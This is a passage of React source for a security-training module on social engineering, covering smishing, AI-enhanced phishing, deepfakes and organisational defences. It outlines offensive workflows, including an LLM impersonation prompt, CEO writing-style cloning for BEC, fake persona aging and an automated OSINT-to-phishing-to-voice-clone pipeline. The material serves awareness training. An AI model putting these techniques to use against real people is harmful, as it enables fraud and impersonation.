# "Tap Trust to start charging" -> grants full data access
# Modern variant: OMG Cable deployed in conference charging point

# Mobile OSINT for targeting:
# Reverse phone lookup: truecaller.com, whitepages
# Carrier identification: textnow, twilio lookup API
# Carrier info determines: SMS delivery route + SS7 attack viability
# Time zone from phone number: infers call timing`}</Pre>
      </div>
    ),
    takeaways: [
      'SMS open rates of 98% (vs 20% for email) and the absence of sophisticated carrier-level filtering make smishing significantly more effective than email phishing per message sent.',
      'QR code phishing (quishing) bypasses email security gateways because URL scanners inspect text and HTML - not image content. QR-embedded URLs are effectively invisible to email security.',
      'SS7 network vulnerabilities allow SMS interception and OTP theft at the telecom level - a reason why SMS-based MFA is considered inadequate for high-security contexts.',
      'WhatsApp Business API allows alphanumeric sender names (e.g. "WESTPAC") which, combined with message templates, makes smishing virtually indistinguishable from legitimate bank communications.',
      'Mobile devices are a weaker security perimeter than corporate workstations: no enterprise proxy, fewer security extensions, less deliberate URL inspection before tapping links.',
    ],
  },

  {
    id: 'ch08-ai-se',
    title: 'AI-Enhanced Social Engineering',
    difficulty: 'ADVANCED',
    readTime: '15 min',
    content: (
      <div>
        <P>Generative AI has fundamentally transformed the economics of social engineering. Previously, producing high-quality, personalised phishing content required skilled writers, significant research time, and expensive production resources. Today, anyone with an API key can generate grammatically perfect, culturally appropriate, highly personalised phishing content at scale in seconds. The barrier to effective social engineering has collapsed.</P>

        <H2>LLM-Generated Phishing at Scale</H2>
        <Pre label="// AI-GENERATED PHISHING CONTENT">{`# Previous bottleneck: writing quality
# Old phishing: grammar errors, generic templates, suspicious phrasing
# Detection method: grammar checking, template matching
# Result: employees trained to spot "bad English" as red flag
#
# Now with LLMs:
# - Native-quality text in any language
# - Personalised to specific person, role, company
# - Writing style matching target's own communication style
# - No template patterns for classifiers to match
# - Can generate hundreds of unique variants per campaign

# OSINT + LLM workflow:
# 1. Collect: LinkedIn profile, GitHub commits, Twitter posts, blog
# 2. Feed to LLM prompt:
#    "Write an email FROM Emma, who is TARGET's manager at COMPANY.
#     Reference their work on the OSINT_PROJECT project.
#     The email should request urgent review of an attached document.
#     Match Emma's professional writing style from these samples."
# 3. LLM generates: highly personalised, contextually accurate email
# 4. Output passes grammar/style detectors designed for generic phishing
# 5. Attach: HTML smuggled payload or malicious document

# Scale:
# Import 500 employee records from Hunter.io + LinkedIn scrape
# Loop LLM API over each target with personalised context
# Generate 500 unique spear phishing emails in minutes
# Each feels individually crafted - because it was (by AI)

# Writing style cloning:
# Feed LLM 10-20 examples of target's writing (emails, posts)
# Prompt: "Write a message in this person's exact writing style"
# Application: clone writing style of CEO for BEC attacks
# Victim recognises "how the CEO writes" -> bypasses suspicion`}</Pre>

        <H2>Deepfake Video for Social Engineering</H2>
        <Pre label="// DEEPFAKE VIDEO APPLICATIONS">{`# Current deepfake video capabilities (2024-2025):
# RunwayML Gen-3: high-quality video generation from image + text
# D-ID: talking-head video from photo + audio/text
# HeyGen: avatar video with lip-sync from script
# Synthesia: enterprise-grade AI avatar video production
# Kling, Sora: longer-form realistic video generation

# Attack applications:
# Fake video verification call:
#   Attacker poses as executive in video call
#   Victim "sees" CEO or CFO - provides authentication info
#
# Documented case: Hong Kong $25M fraud (January 2024)
#   Finance employee attended video call with "CFO + board"
#   All participants were AI deepfake video
#   Approved wire transfer of HKD 200 million
#   Discovered only after calling real head office
#
# UK CEO voice + video fraud:
#   Deepfake video conference call convinced M&A counsel
#   Transfer of 35 million euros to attacker-controlled accounts

# Creating deepfake video for SE:
# Source material: earnings calls, conference keynotes, LinkedIn video
# D-ID or HeyGen: upload photo + provide audio/text script
# Result: convincing talking head of target executive
# Real-time deepfake: lower quality but live interaction possible
# Tools: DeepFaceLab, FaceSwap (higher skill, better quality)

# Detection indicators (rapidly becoming unreliable):
# Blink rate: AI-generated faces blink less naturally
# Lip sync: slight desync at high speech rates
# Facial boundary: subtle artefacts at hairline, glasses edge
# Lighting: inconsistent with claimed environment
# Micro-expressions: absent or reduced in current models`}</Pre>

        <H2>AI Persona Management</H2>
        <Pre label="// AI-GENERATED FAKE IDENTITIES">{`# Creating a convincing fake person:
# Face: thispersondoesnotexist.com (StyleGAN, refreshes each load)
# Alternative: generated.photos, Stable Diffusion portrait lora
# LinkedIn profile: LLM generates work history, skills, education
# GitHub: populate with AI-generated "contributions"
# Twitter/X: AI-generated posts over time (persona aging)

# Persona aging:
# Create account 6-12 months before use
# Gradually add posts, connections, activity
# Aged persona has history, connections, credibility
# LinkedIn: connect with real targets in advance (social proof)
# Result: persona looks established when finally used for SE

# AI-managed social media personas at scale:
# Multiple fake employees of a fake consultancy
# Each persona connects with real employees of target company
# After establishing trust: targeted content delivery
# Classic intelligence community technique, now automated

# Detection tells for AI personas:
# Generated faces: unusual ear geometry, teeth irregularities
# Reverse image search: no matches (image unique, but no history)
# Profile: too perfect, no negative posts, uniform positivity
# Activity: posts at unusual hours, no engagement with personal topics
# Connections: mostly new accounts or other AI personas`}</Pre>

        <H2>Defensive AI Against SE</H2>
        <Pre label="// AI DETECTION AND DEFENCE">{`# Email-based AI content detection:
# Tools: Writer.com detector, Originality.ai, ZeroGPT
# Accuracy: 60-80% (improving but unreliable currently)
# Problem: detection is training-data dependent
# Evasion: slightly rephrase LLM output -> usually undetected
# Future: watermarking (C2PA standard) may help

# Voice deepfake detection:
# Pindrop: enterprise voice authentication (detects synthesis)
# Nuance: voiceprint authentication for call centres
# Audio artefacts: too-clean audio (no room noise), breathing gaps
# Challenge: ask about something not in public training data

# Video deepfake detection:
# Microsoft Video Authenticator: analyses video for manipulation
# FakeCatcher (Intel): real-time deepfake detection
# Tells: subtle colour changes in pixels related to blood flow
# Detection accuracy: declining as generation quality improves

# Procedural defences (most reliable):
# Code words: pre-arrange secret phrase with executives
# "If you ever call me for a transfer, use the code word"
# Out-of-band confirmation: always confirm via different channel
# Callback to KNOWN number: never the number in the message
# Tiered approval: video call request alone is insufficient
# Video challenge: ask person to hold up fingers, do specific action`}</Pre>

        <H2>The Automated Attack Pipeline</H2>
        <Pre label="// FULLY AUTOMATED TARGETED SE PIPELINE">{`# Research -> Content -> Delivery -> Compromise
# Fully automatable with current tools (2024-2025)

# Stage 1: Automated OSINT
# Input: company domain
# Tools: TheHarvester + LinkedIn scraper + Hunter.io API
# Output: CSV of employees with name, email, role, LinkedIn URL

# Stage 2: Profile enrichment
# For each employee: scrape LinkedIn, GitHub, Twitter
# Store: work history, connections, recent activity, tech skills
# Tools: Phantombuster, Clay.com, custom Python scrapers

# Stage 3: LLM content generation
# For each target: generate personalised email using profile data
# Prompt includes: name, manager, team, current project, tool used
# Output: unique spear phishing email per target
# Review: human reviews 5-10% sample before sending

# Stage 4: Campaign execution
# GoPhish API imports targets + templates automatically
# Sends personalised emails at human-mimicking intervals
# Tracks: opens, clicks, credentials per target

# Stage 5: AI-driven follow-up
# Targets who did not click: send follow-up vishing call
# Voice: ElevenLabs-cloned manager voice
# Script: AI-generated based on email content

# The defence implication:
# Every employee is now reachable with a fully personalised attack
# Scale no longer limits precision
# Human security awareness training must evolve to match`}</Pre>

        <Warn>Deepfake voice and video technology has legitimate uses in entertainment, accessibility, and production. The same capabilities have been documented in multi-million dollar fraud. Understanding these techniques is essential for defenders to build appropriate verification procedures.</Warn>
      </div>
    ),
    takeaways: [
      'LLMs remove the writing quality bottleneck: AI now generates grammatically perfect, contextually accurate, individually personalised phishing at scale in seconds.',
      'The $25M Hong Kong deepfake fraud (2024) demonstrates that AI video impersonation is now capable of deceiving experienced finance professionals in live video calls.',
      'Fully automated SE pipelines are achievable today: OSINT scraping -> LLM content generation -> GoPhish delivery -> ElevenLabs follow-up calls. Scale no longer limits precision.',
      'AI persona management (aged LinkedIn profiles with AI-generated faces) enables long-term relationship building with targets before the final exploitation stage.',
      'Procedural defences (pre-arranged code words, out-of-band confirmation, video challenges) are more reliable than technical detection tools, which are losing the arms race against generation quality.',
    ],
  },

  {
    id: 'ch09-defence',
    title: 'Building Awareness and Defence',
    difficulty: 'BEGINNER',
    readTime: '16 min',
    content: (
      <div>
        <P>The most effective defence against social engineering is a culture where employees feel empowered to challenge unusual requests, verify identities through a second channel, and report suspicious contacts without fear of embarrassment. Technical controls like DMARC and hardware MFA are critical, but the human layer is what ultimately stops these attacks when technology fails.</P>

        <Note>Security awareness training that focuses on compliance ("click this mandatory module") consistently fails to change behaviour. Effective SE defence requires building habits, making security easy, and creating a reporting culture where being cautious is celebrated, not mocked.</Note>

        <H2>Why Technical Controls Fail Against SE</H2>
        <Pre label="// THE HUMAN BYPASS PROBLEM">{`# Technical controls validate credentials and configurations
# They cannot validate intent or context

# Examples of how SE bypasses every technical control:
#
# Firewall: bypassed when legitimate user with malicious intent acts
# Antivirus: bypassed when victim enables macros (user override)
# MFA: bypassed when victim reads OTP to attacker over phone
# Email gateway: bypassed when victim clicks past warning banner
# DLP: bypassed when victim emails data to "supplier" (fake vendor)
# Privileged access: bypassed when admin is socially engineered
# Zero trust: bypassed when legitimate session used by insider/SE victim
#
# The problem: every security control has a human bypass condition
# The solution: train the human layer, don't just add more controls

# Where training works:
# Teaching specific red flags that trigger System 2 (slow thinking)
# Building verification habits that are automatic
# Creating reporting culture that makes reporting safe and easy
# Simulating attacks regularly to build pattern recognition

# Where training fails:
# Compliance checkbox: annual video watched, quiz passed -> forgotten
# Punishment focus: employees fear reporting because of consequences
# Generic content: "don't click bad links" without specific context
# No reinforcement: one training, never revisited`}</Pre>

        <H2>Email Security Stack</H2>
        <Pre label="// TECHNICAL EMAIL DEFENCES">{`# SPF (Sender Policy Framework):
# Publish: v=spf1 include:_spf.google.com -all
# -all (hardfail): reject email from unauthorised senders
# Prevents: spoofing of your domain FROM unauthorised IPs
# Does NOT prevent: lookalike domain spoofing (company-it.com)

# DKIM (DomainKeys Identified Mail):
# Signs outgoing emails with private key
# Recipients verify signature with public key in DNS
# Prevents: email content tampering in transit
# Survives: email forwarding (unlike SPF which fails on forward)

# DMARC (Domain-based Message Authentication):
# Ties SPF + DKIM together, specifies what to do on failure
# Minimum: v=DMARC1; p=quarantine; rua=mailto:dmarc@DOMAIN.com
# Target: v=DMARC1; p=reject; rua=mailto:dmarc@DOMAIN.com
# p=reject: emails failing both SPF and DKIM are rejected
# rua=: aggregate reports sent to your address (visibility)
# p=reject with reporting = gold standard

# BIMI (Brand Indicators for Message Identification):
# Displays company logo in email client inbox (Gmail, Outlook)
# Requires: DMARC p=quarantine or p=reject
# Adds: visual verification for legitimate emails
# Configuration: DNS TXT record pointing to SVG logo + VMC cert

# Email gateway capabilities (defend in depth):
# URL rewriting: all links rewritten through gateway for scanning
# Attachment sandboxing: files detonated in isolated VM
# Anti-spoofing: display name vs envelope-from mismatch detection
# External email banner: "This email originated outside your organisation"
# Impersonation protection: flags emails impersonating internal addresses`}</Pre>

        <H2>MFA Selection - Resistance to SE Attacks</H2>
        <Table
          headers={['MFA TYPE', 'DEFEATS PHISHING?', 'DEFEATS VISHING MFA BYPASS?', 'NOTES']}
          rows={[
            ['SMS OTP', 'Partially', 'No - interceptable and can be read to attacker', 'Better than nothing, weakest MFA option'],
            ['TOTP Authenticator app', 'No - code phishable via AiTM or vishing', 'No - caller asks victim to read code', 'Significantly better than SMS despite limitations'],
            ['Push notification', 'Partially', 'Vulnerable to MFA fatigue / push bombing', 'Number matching mitigates fatigue attacks'],
            ['FIDO2 / WebAuthn hardware key', 'Yes - domain-bound, cannot be phished', 'Yes - no code to intercept or read out', 'Gold standard - YubiKey, Google Titan Key'],
            ['Passkeys (FIDO2 on device)', 'Yes - domain-bound biometric auth', 'Yes - device validates domain before auth', 'Modern, best UX - face/fingerprint + domain binding'],
          ]}
        />

        <H2>Phishing Simulation Programs</H2>
        <Pre label="// RUNNING EFFECTIVE PHISHING SIMULATIONS">{`# Commercial platforms:
# KnowBe4: largest library of templates, automated training assignments
# Proofpoint Security Awareness: integrated with email gateway data
# Cofense PhishMe: crowdsourced threat intelligence integration
# Sophos Phish Threat: bundled with endpoint protection
# Microsoft Attack Simulator: built into Microsoft 365 Defender

# Simulation program design principles:

# 1. Frequency: run monthly, not annually
#    One simulation/year: employees forget between runs
#    Monthly: pattern recognition builds over time

# 2. Difficulty progression: start easy, increase sophistication
#    Month 1-3: generic phishing (easy to spot)
#    Month 4-6: spear phishing using employee name
#    Month 7+: AiTM campaigns, vishing, smishing

# 3. Immediate training on failure:
#    Clicked link -> instantly shown training module
#    Context: "Here is why this looked legitimate and what to check"
#    No humiliation: frame as learning, not failure

# 4. Reward reporting:
#    Employees who REPORT suspicious emails: acknowledged, rewarded
#    Never punish false positive reports (better to over-report)
#    Track: report rate as primary success metric (not click rate)

# 5. Metrics that matter:
#    Click rate: decreasing trend over time -> training working
#    Report rate: increasing trend -> culture improving
#    Dwell time: how long between phish sent and report received
#    Department comparison: who needs more targeted training?`}</Pre>

        <H2>Verification Procedures and Reporting Culture</H2>
        <Pre label="// HUMAN SECURITY PROCEDURES">{`# The verification rule (teach explicitly):
# Any request that involves:
#   - Transferring money
#   - Providing credentials or MFA codes
#   - Installing software
#   - Giving access to systems
#   - Bypassing normal process
# REQUIRES: out-of-band verification

# Verification method:
# WRONG: "Reply to this email to confirm"
# WRONG: "Call the number in this email"
# RIGHT: Hang up, look up the KNOWN number, call back independently
# RIGHT: Walk to the person's desk if in the same building
# RIGHT: Use official internal directory (not the one in the email)
# RIGHT: Video call + challenge question + code word

# Specific procedures by request type:
# Password reset request:
#   Verify caller identity via video + employee ID
#   Reset goes to registered email/phone, not caller-specified
#
# Wire transfer request:
#   Dual approval above set threshold
#   Callback to known executive number (from internal directory)
#   No urgency override procedure - urgency is a red flag
#
# Vendor payment detail change:
#   Written request from verified email + phone confirmation
#   Wait 48h before processing (cooling off period)
#
# IT support remote access:
#   Verify ticket number in internal system first
#   Never accept remote session request from unknown caller

# Building reporting culture:
# CEO/CISO model reporting: "I almost fell for this one - here is what it was"
# Reward near-misses reported: treat as security wins
# Never mock employees who are phished in simulation
# "See something say something" - low friction reporting channel`}</Pre>

        <H2>Privileged Account Hygiene</H2>
        <Pre label="// REDUCING SE BLAST RADIUS">{`# Separate admin accounts:
# Domain Admins should not browse the internet as DA
# Separate: daily user account + privileged account for admin tasks
# If daily account is phished: no admin access compromised
# PAM (Privileged Access Management): CyberArk, BeyondTrust, HashiCorp

# Principle of least privilege:
# SE victim can only do what their account can do
# Finance staff: no access to IT systems
# HR staff: no access to financial transfer systems
# Limits blast radius when an account IS compromised

# Conditional access for SE resistance:
# Unusual login location -> step-up authentication
# New device + overseas location -> block + alert
# Admin login from non-admin workstation -> block
# Impossible travel detection -> alert and verify

# Incident response for SE attacks:
# Phase 1: Contain (revoke compromised credentials immediately)
# Phase 2: Assess (what did attacker access/exfiltrate/modify?)
# Phase 3: Communicate (notify affected parties, regulators if required)
# Phase 4: Recover (restore from backup if data modified)
# Phase 5: Learn (what controls failed? what worked?)

# SE tabletop exercise (run this with security team):
# Scenario: finance employee receives BEC email, complies, transfers funds
# Walk through: how was it detected? by whom? how long after?
# Test: communication plan, decision authority, legal obligations
# Outcome: identify gaps before real incident occurs`}</Pre>

        <H2>Physical Security Controls</H2>
        <Pre label="// PHYSICAL DEFENCE STACK">{`# Mantraps (airlock entry systems):
# Two-door system: first door must close before second opens
# No opportunity to tailgate through a mantrap
# Expensive: justify at server room, data centre, secure areas

# Anti-tailgating solutions:
# Optical turnstiles: count individuals passing through
# AI video analytics: detect two people on one badge swipe
# Speed gates: close fast enough to prevent following
# Education: "challenge strangers, hold doors only when verified"

# Visitor management:
# Pre-register visitors in advance
# Photo ID required + matched to pre-registration
# Visitor badge clearly distinguishable from employee badge
# Escort required throughout (no unaccompanied visitors)
# Physical access log for all entries

# Badge design for security:
# Colour coding by access level: blue = general, red = secure
# Photo prominent and large
# Holographic overlay (hard to photocopy)
# RFID: use encrypted cards (SEOS, DESfire) not EM4100
# Regular audits: deactivate badges of former employees within 1h

# USB policy:
# Disable USB storage at endpoint (Group Policy, MDM)
# Allow: keyboard, mouse (HID) - not storage
# Exception process: secure, IT-supplied USBs only
# USB charging-only ports in public areas (data lines disabled)`}</Pre>
      </div>
    ),
    takeaways: [
      'DMARC with p=reject is the single most impactful technical control against email-based social engineering - it prevents spoofing of your own domain and should be the first deployment priority.',
      'FIDO2 hardware keys (passkeys, YubiKey) are the only MFA type that defeats both phishing and vishing MFA bypass - they are domain-bound so stolen codes cannot be replayed elsewhere.',
      'Monthly phishing simulations with immediate contextual training on failure, combined with active reward for reporting, produces measurable behaviour change where annual compliance training does not.',
      'Verification culture - hang up, look up the known number, call back - is the most effective human control. The phone number in the message is always suspect.',
      'Privileged account separation (domain admin account used only for admin tasks, never for browsing) limits the blast radius when an SE attack succeeds against any individual account.',
    ],
  },
]

export default function SocialEngineeringPage() {
  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: mono, fontSize: '0.7rem', color: '#6a4a5a' }}>
        <Link href="/" style={{ color: '#6a4a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>MOD-10 // SOCIAL ENGINEERING</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: 'rgba(255,110,199,0.08)', border: '1px solid rgba(255,110,199,0.3)', borderRadius: '3px', color: accent, fontSize: '8px' }}>CONCEPT</span>
          <Link href="/modules/social-engineering/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'rgba(255,110,199,0.1)', border: '1px solid rgba(255,110,199,0.5)', borderRadius: '3px', color: '#ff6ec7', fontSize: '8px', letterSpacing: '0.15em', fontWeight: 700 }}>LAB &#8594;</Link>
        </div>
      </div>

      {/* Header */}
      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: mono, fontSize: '9px', color: '#6a4a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>MODULE 10 &middot; CONCEPT PAGE &middot; 9 CHAPTERS</div>
        <h1 style={{ fontFamily: mono, fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: 'rgba(255,110,199,0.35) 0 0 20px' }}>SOCIAL ENGINEERING</h1>
        <p style={{ color: '#6a4a5a', fontFamily: mono, fontSize: '0.75rem' }}>
          Psychology &middot; Phishing &middot; Vishing &middot; Physical &middot; OSINT &middot; Tools &middot; Smishing &middot; AI-Enhanced SE &middot; Defence
        </p>
      </div>

      {/* Chapter overview stats */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '12px', marginBottom: '2.5rem' }}>
        {[
          ['9', 'CHAPTERS'],
          ['~3.0hr', 'TOTAL READ'],
          ['INTERMEDIATE', 'DIFFICULTY'],
          ['MOD-10', 'IDENTIFIER'],
        ].map(([val, label], i) => (
          <div key={i} style={{ background: 'rgba(255,110,199,0.04)', border: '1px solid rgba(255,110,199,0.15)', borderRadius: '6px', padding: '1rem', textAlign: 'center' }}>
            <div style={{ fontFamily: mono, fontSize: '1.2rem', fontWeight: 700, color: accent }}>{val}</div>
            <div style={{ fontFamily: mono, fontSize: '0.6rem', color: '#4a1a3a', letterSpacing: '0.15em', marginTop: '2px' }}>{label}</div>
          </div>
        ))}
      </div>

      {/* Codex */}
      <ModuleCodex
        moduleId="social-engineering"
        accent={accent}
        chapters={chapters}
      />

      {/* Bottom navigation */}
      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: '1px solid #1a0014' }}>
        <div style={{ background: 'rgba(255,110,199,0.04)', border: '1px solid rgba(255,110,199,0.2)', borderRadius: '8px', padding: '2rem', textAlign: 'center', marginBottom: '1.5rem' }}>
          <div style={{ fontFamily: mono, fontSize: '0.65rem', color: '#4a1a3a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>READY TO PRACTICE?</div>
          <div style={{ fontFamily: mono, fontSize: '1rem', color: accent, marginBottom: '0.5rem', fontWeight: 600 }}>MOD-10 Interactive Lab</div>
          <div style={{ fontFamily: mono, fontSize: '0.75rem', color: '#4a1a3a', marginBottom: '1.5rem' }}>16 steps &middot; 300 XP &middot; Real commands &middot; Flag captures</div>
          <Link href="/modules/social-engineering/lab" style={{ textDecoration: 'none', fontFamily: mono, fontSize: '0.85rem', color: accent, padding: '12px 32px', border: '1px solid rgba(255,110,199,0.6)', borderRadius: '6px', background: 'rgba(255,110,199,0.1)', fontWeight: 700, letterSpacing: '0.12em', boxShadow: '0 0 20px rgba(255,110,199,0.15)', display: 'inline-block' }}>
            LAUNCH LAB &#8594;
          </Link>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between' }}>
          <Link href="/modules/cloud-security" style={{ textDecoration: 'none', fontFamily: mono, fontSize: '0.75rem', color: '#4a1a3a' }}>&#8592; MOD-09: CLOUD SECURITY</Link>
          <Link href="/modules/red-team" style={{ textDecoration: 'none', fontFamily: mono, fontSize: '0.75rem', color: '#4a1a3a' }}>MOD-11: RED TEAM &#8594;</Link>
        </div>
      </div>
    </div>
  )
}
